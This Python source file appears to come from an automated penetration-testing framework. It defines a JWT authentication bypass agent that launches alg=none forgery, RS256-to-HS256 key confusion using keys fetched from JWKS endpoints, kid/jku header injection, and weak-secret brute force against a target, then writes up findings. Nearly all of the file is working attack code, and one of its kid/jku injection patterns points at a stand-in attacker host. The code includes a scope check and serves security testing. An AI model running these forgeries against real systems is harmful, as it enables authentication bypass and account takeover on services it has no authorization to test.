"""
AuthNinja JWT: JWT認証バイパス専門エージェント

JWTInspector - JWT authentication bypass specialist agent.
"""
from typing import Optional
import logging

from src.core.security.ethics_guard import (
    get_ethics_guard,
    ActionType,
    ActionResult,
)
from src.core.models.finding import Finding, Evidence, Severity, VulnType
from src.tools.builtin.handoff import (
    HandoffContext,
    HandoffResult,
    HandoffStatus,
    create_handoff_result,
)
from src.core.engine.agent_registry import register_agent
from src.core.agents.base import AgentConfig
from .auth_ninja_base import BaseAuthAgent
from src.core.utils.asset_loader import asset_loader

logger = logging.getLogger(__name__)


@register_agent(
    names=["authninja", "jwt_inspector", "jwt", "jwtinspector"],
    tags=["web", "auth", "all"]
)
class JWTInspector(BaseAuthAgent):
    """
    JWT-Inspector: JWT認証バイパス専門
    """

    def __init__(self, config: AgentConfig = None, workspace_root: Optional[str] = None, rag_switch=None, program_name: str = ""):
        if config is None:
            config = AgentConfig(
                name="JWT-Inspector",
                description="JWT authentication bypass specialist agent",
                model="default",
                instructions="Execute JWT bypass attacks"
            )
        super().__init__(config, workspace_root=workspace_root)

        # Note: self.name is inherited from BaseAgent (property accessing config.name)
        self._rag_switch = rag_switch
        self._guard = get_ethics_guard()
        self._program_name = program_name
        self._payloads = None

    @property
    def payloads(self):
        if self._payloads is None:
             self._payloads = asset_loader.load_yaml("auth_payloads.yaml").get("jwt_inspector", {})
        return self._payloads

    @property
    def STR_WEAK_SECRETS(self):
         return self.payloads.get("weak_secrets", [])

    @property
    def STR_ALG_NONE_VARIANTS(self):
         return self.payloads.get("alg_none_variants", [])

    def set_rag_switch(self, rag_switch) -> None:
        """RAGSwitchを設定"""
        self._rag_switch = rag_switch

    def set_program_name(self, name: str) -> None:
        """プログラム名を設定（レポート用）"""
        self._program_name = name

    async def execute(self, context: Optional[HandoffContext] = None, **kwargs) -> HandoffResult:
        """
        JWT認証バイパスを並列検証

        EthicsGuard連携: リクエスト前にスコープチェック
        Finding生成: 成功時にAuto-Reporter用のデータを作成
        """
        if context is None:
            # 互換性レイヤー: kwargs から HandoffContext を生成
            target = kwargs.get("target", "")
            params = kwargs.get("params", {})
            context = HandoffContext.from_params({"target": target, **params})

        target = context.target_url
        token = context.authentication.get("token", "") or context.metadata.get("token", "")

        # 初期結果
        result = create_handoff_result(
            agent_name=self.name,
            status="failed",
            target_url=target,
        )

        if not token:
            result.error = "No JWT token provided"
            return result

        # EthicsGuard: スコープチェック
        is_allowed, reason = self._guard.check_action(ActionType.HTTP_REQUEST, target)
        if is_allowed != ActionResult.ALLOWED:
            result.status = HandoffStatus.BLOCKED
            result.error = reason
            return result

        # 各攻撃手法を試行
        methods = [
            ("alg_none", VulnType.JWT_ALG_NONE, self._try_alg_none),
            ("rs256_hs256", VulnType.JWT_RS256_HS256, self._try_rs256_to_hs256),
            ("kid_injection", VulnType.JWT_KID_INJECTION, self._try_kid_injection),
            ("weak_secret", VulnType.JWT_WEAK_SECRET, self._try_weak_secret),
        ]

        for method_name, vuln_type, method_func in methods:
            # All check methods are now async
            attack_result = await method_func(target, token, context.metadata)
            if attack_result.get("success"):
                finding = self._create_finding(
                    target=target,
                    method_name=method_name,
                    vuln_type=vuln_type,
                    result=attack_result,
                    params=context.metadata,
                )

                result.status = HandoffStatus.SUCCESS
                result.bypass_method = method_name
                result.credentials = attack_result.get("credentials", {})
                result.recommendations = [
                    f"JWT bypass succeeded via {method_name}",
                    "Consider testing other endpoints with forged token",
                ]
                result.success_probability = 0.8
                result.response_data = attack_result.get("details", {})
                result.findings = [finding.to_dict()] if finding else []
                result.vulnerability_hypothesis = f"JWT {method_name} vulnerability confirmed"

                self.log_attempt(target, method_name, True)

                # 共有ワークスペースに保存
                if finding:
                    await self.save_finding(finding.to_dict())

                break
            else:
                self.log_attempt(target, method_name, False)

        return result



    def _create_finding(
        self,
        target: str,
        method_name: str,
        vuln_type: VulnType,
        result: dict,
        params: dict,
    ) -> Finding:
        """成功した攻撃からFindingを生成"""
        forged_token = result.get("forged_token", "")
        details = result.get("details", {})

        return Finding(
            vuln_type=vuln_type,
            severity=Severity.CRITICAL,
            title=f"JWT Authentication Bypass via {method_name}",
            description=(
                f"The application accepts JWT tokens with manipulated algorithm header. "
                f"An attacker can forge valid tokens without knowing the secret key."
            ),
            target_url=target,
            target_program=self._program_name,
            evidence=Evidence(
                request_method="GET",
                request_url=params.get("test_endpoint", target),
                request_headers={"Authorization": f"Bearer {forged_token[:50]}..."},
                response_status=result.get("response_status", 200),
            ),
            reproduction_steps=[
                f"1. Intercept a valid JWT token from the application",
                f"2. Decode the JWT header (Base64)",
                f"3. Change 'alg' field to '{details.get('alg_variant', 'none')}'",
                f"4. Remove the signature portion",
                f"5. Send the modified token to {target}",
                f"6. Observe successful authentication without valid signature",
            ],
            impact=(
                "An attacker can bypass authentication entirely by forging JWT tokens. "
                "This allows unauthorized access to any user account, including admin accounts. "
                "Full account takeover is possible."
            ),
            source_agent="jwt_inspector",
            confidence=0.95,
            cwe_id="CWE-347",
            additional_info=details,
        )

    async def _try_alg_none(self, target: str, token: str, params: dict) -> dict:
        """
        alg=none攻撃を試行

        署名検証をスキップするためにalgorithmをnoneに変更。
        JWTTester を利用して攻撃トークンを生成し、試行する。
        """
        from src.core.attack.jwt_tester import JWTTester
        tester = JWTTester()

        # 攻撃用トークンの生成 (alg=noneの様々なバリエーションとシグネチャ有無)
        attack_tokens = tester.generate_alg_none(token)
        if not attack_tokens:
            return {"success": False, "error": "Invalid JWT format"}

        for forged_token in attack_tokens:
            try:
                headers = params.get("headers", {}).copy()
                headers["Authorization"] = f"Bearer {forged_token}"

                # 認証が必要なエンドポイントにリクエスト
                test_endpoint = params.get("test_endpoint", target)
                timeout = params.get("timeout", 10)

                response = await self.network_client.request(
                    method="GET",
                    url=test_endpoint,
                    headers=headers,
                    timeout=timeout,
                    allow_redirects=False,
                    use_proxy=True
                )

                # 成功判定: 200-299かつ認証エラーでない
                if 200 <= response.status < 300:
                    body = response.text.lower()
                    if not any(err in body for err in ["unauthorized", "invalid token", "expired"]):
                        # 成功したトークンがどのアルゴリズム指定で通ったか確認
                        h = tester.extract_header(forged_token + "dummy" if forged_token.endswith(".") else forged_token)

                        return {
                            "success": True,
                            "forged_token": forged_token,
                            "credentials": {
                                "forged_jwt": forged_token,
                                "payload": tester.extract_claims(forged_token + "dummy" if forged_token.endswith(".") else forged_token),
                            },
                            "response_status": response.status,
                            "details": {
                                "alg_variant": h.get("alg", "none"),
                                "rag_assisted": False,
                                "original_alg": tester.extract_header(token).get("alg"),
                            }
                        }
            except Exception:
                continue

        return {"success": False, "error": "All alg=none variants failed"}



    async def _try_rs256_to_hs256(self, target: str, token: str, params: dict) -> dict:
        """RS256→HS256混同攻撃を試行"""
        import base64
        import json
        import hmac
        import hashlib
        from urllib.parse import urljoin
        try:
            from cryptography.hazmat.primitives.asymmetric import rsa
            from cryptography.hazmat.primitives import serialization
        except ImportError:
            return {"success": False, "error": "cryptography module not found"}

        try:
            # JWTをパース
            parts = token.split(".")
            if len(parts) != 3:
                return {"success": False, "error": "Invalid JWT format"}

            header_b64, payload_b64, _ = parts
            header = json.loads(base64.urlsafe_b64decode(header_b64 + "=" * (4 - len(header_b64) % 4)))
            payload = json.loads(base64.urlsafe_b64decode(payload_b64 + "=" * (4 - len(payload_b64) % 4)))

            # RS256でない場合はスキップ
            if header.get("alg") != "RS256":
                return {"success": False, "error": "Token is not RS256"}

            # 公開鍵取得を試行（JWKS エンドポイント）
            public_key_pem = None
            jwks_urls = [
                urljoin(target, "/.well-known/jwks.json"),
                urljoin(target, "/jwks.json"),
                urljoin(target, "/.well-known/openid-configuration"),
                params.get("jwks_url", ""),
            ]

            for jwks_url in jwks_urls:
                if not jwks_url:
                    continue
                try:
                    resp = await self.network_client.request(
                        method="GET",
                        url=jwks_url,
                        timeout=5,
                        use_proxy=True
                    )
                    if resp.status == 200:
                        # JWKSから公開鍵を抽出（簡易実装）
                        jwks = resp.json()
                        if "keys" in jwks and len(jwks["keys"]) > 0:
                            # JWKSから公開鍵パラメータ(n, e)を抽出してPEMに変換
                            key_data = jwks["keys"][0]
                            if "n" in key_data and "e" in key_data:
                                n_val = int.from_bytes(base64.urlsafe_b64decode(key_data["n"] + "=="), "big")
                                e_val = int.from_bytes(base64.urlsafe_b64decode(key_data["e"] + "=="), "big")

                                public_key = rsa.RSAPublicNumbers(e_val, n_val).public_key()
                                pem_bytes = public_key.public_bytes(
                                    encoding=serialization.Encoding.PEM,
                                    format=serialization.PublicFormat.SubjectPublicKeyInfo
                                )
                                public_key_pem = pem_bytes.decode('utf-8')
                                break
                except Exception:
                    continue

            # 公開鍵が取得できなかった場合（実装未完）
            if not public_key_pem:
                return {"success": False, "error": "Could not retrieve public key (implementation incomplete)"}

            # 公開鍵をHS256の秘密鍵として使用して署名
            # header を HS256 に変更
            forged_header = header.copy()
            forged_header["alg"] = "HS256"

            header_encoded = base64.urlsafe_b64encode(
                json.dumps(forged_header, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()

            payload_encoded = base64.urlsafe_b64encode(
                json.dumps(payload, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()

            message = f"{header_encoded}.{payload_encoded}".encode()
            signature = base64.urlsafe_b64encode(
                hmac.new(public_key_pem.encode(), message, hashlib.sha256).digest()
            ).rstrip(b"=").decode()

            forged_token = f"{header_encoded}.{payload_encoded}.{signature}"

            # テスト
            test_endpoint = params.get("test_endpoint", target)
            headers = params.get("headers", {}).copy()
            headers["Authorization"] = f"Bearer {forged_token}"

            response = await self.network_client.request(
                method="GET",
                url=test_endpoint,
                headers=headers,
                timeout=10,
                allow_redirects=False,
                use_proxy=True
            )

            if 200 <= response.status < 300:
                body = response.text.lower()
                if not any(err in body for err in ["unauthorized", "invalid token", "expired"]):
                    return {
                        "success": True,
                        "forged_token": forged_token,
                        "credentials": {"forged_jwt": forged_token, "payload": payload},
                        "response_status": response.status,
                    }

        except Exception as e:
            return {"success": False, "error": f"RS256->HS256 attack failed: {str(e)}"}

        return {"success": False, "error": "RS256->HS256 confusion attack failed"}


    async def _try_kid_injection(self, target: str, token: str, params: dict) -> dict:
        """kid/jkuインジェクションを試行"""
        import base64
        import json

        try:
            parts = token.split(".")
            if len(parts) != 3:
                return {"success": False, "error": "Invalid JWT format"}

            header_b64, payload_b64, _ = parts
            header = json.loads(base64.urlsafe_b64decode(header_b64 + "=" * (4 - len(header_b64) % 4)))
            payload = json.loads(base64.urlsafe_b64decode(payload_b64 + "=" * (4 - len(payload_b64) % 4)))

            # kid/jku インジェクションパターン
            injection_patterns = [
                {"kid": "../../dev/null"},
                {"kid": "/dev/null"},
                {"kid": "none"},
                {"jku": "https://attacker.com/jwks.json"},
                {"jku": f"{target}/../../attacker.com/jwks.json"},
            ]

            for pattern in injection_patterns:
                forged_header = header.copy()
                forged_header.update(pattern)

                # トークンを再構築（簡易実装 - 実際は署名も必要）
                header_encoded = base64.urlsafe_b64encode(
                    json.dumps(forged_header, separators=(",", ":")).encode()
                ).rstrip(b"=").decode()

                payload_encoded = base64.urlsafe_b64decode(payload_b64 + "=" * (4 - len(payload_b64) % 4))
                payload_encoded = base64.urlsafe_b64encode(payload_encoded).rstrip(b"=").decode()

                # 署名なしで試行（alg=noneと組み合わせ）
                forged_token = f"{header_encoded}.{payload_encoded}."

                # テスト
                test_endpoint = params.get("test_endpoint", target)
                headers = params.get("headers", {}).copy()
                headers["Authorization"] = f"Bearer {forged_token}"

                response = await self.network_client.request(
                    method="GET",
                    url=test_endpoint,
                    headers=headers,
                    timeout=10,
                    allow_redirects=False,
                    use_proxy=True
                )

                if 200 <= response.status < 300:
                    body = response.text.lower()
                    if not any(err in body for err in ["unauthorized", "invalid"]):
                        return {
                            "success": True,
                            "forged_token": forged_token,
                            "credentials": {"injected_header": pattern},
                            "response_status": response.status,
                        }

        except Exception as e:
            return {"success": False, "error": f"kid injection failed: {str(e)}"}

        return {"success": False, "error": "All kid/jku injection patterns failed"}

    async def _try_weak_secret(self, target: str, token: str, params: dict) -> dict:
        """弱い秘密鍵をブルートフォース"""
        import base64
        import json
        import hmac
        import hashlib

        try:
            parts = token.split(".")
            if len(parts) != 3:
                return {"success": False, "error": "Invalid JWT format"}

            header_b64, payload_b64, signature_b64 = parts
            header = json.loads(base64.urlsafe_b64decode(header_b64 + "=" * (4 - len(header_b64) % 4)))

            # HS256/HS512 のみブルートフォース可能
            alg = header.get("alg", "")
            if not alg.startswith("HS"):
                return {"success": False, "error": f"Algorithm {alg} not suitable for brute force"}

            # メッセージ部分
            message = f"{header_b64}.{payload_b64}".encode()

            # 各秘密鍵候補で署名を検証
            for secret in self.STR_WEAK_SECRETS:
                if alg == "HS256":
                    expected_sig = base64.urlsafe_b64encode(
                        hmac.new(secret.encode(), message, hashlib.sha256).digest()
                    ).rstrip(b"=").decode()
                elif alg == "HS512":
                    expected_sig = base64.urlsafe_b64encode(
                        hmac.new(secret.encode(), message, hashlib.sha512).digest()
                    ).rstrip(b"=").decode()
                else:
                    continue

                # 署名が一致すれば秘密鍵を発見
                if expected_sig == signature_b64:
                    return {
                        "success": True,
                        "discovered_secret": secret,
                        "credentials": {"jwt_secret": secret},
                        "details": {"algorithm": alg},
                    }

        except Exception as e:
            return {"success": False, "error": f"Weak secret brute force failed: {str(e)}"}

        return {"success": False, "error": "No weak secret found"}
